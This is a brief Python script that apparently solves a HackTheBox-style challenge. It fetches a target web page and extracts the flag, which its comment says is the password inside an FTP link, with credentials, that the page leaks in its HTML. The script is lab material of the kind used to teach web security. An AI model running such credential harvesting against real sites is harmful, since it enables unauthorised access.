#!/usr/bin/env python3
import re
import sys
import urllib.error
import urllib.request

# The FAQ page embeds an ftp:// link with credentials for "dev" in its HTML.
# The password part of that link is the flag, so the page source is enough.


def get(url):
    try:
        with urllib.request.urlopen(url, timeout=15) as resp:
            return resp.read().decode(errors="replace")
    except urllib.error.HTTPError as err:
        return err.read().decode(errors="replace")


def exploit(host, port):
    page = get(f"http://{host}:{port}/")
    flag = re.search(r"HTB\{[^}]*\}", page)
    if not flag:
        raise RuntimeError("flag not found in page source")
    print(f"[+] Flag:\n{flag.group(0)}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
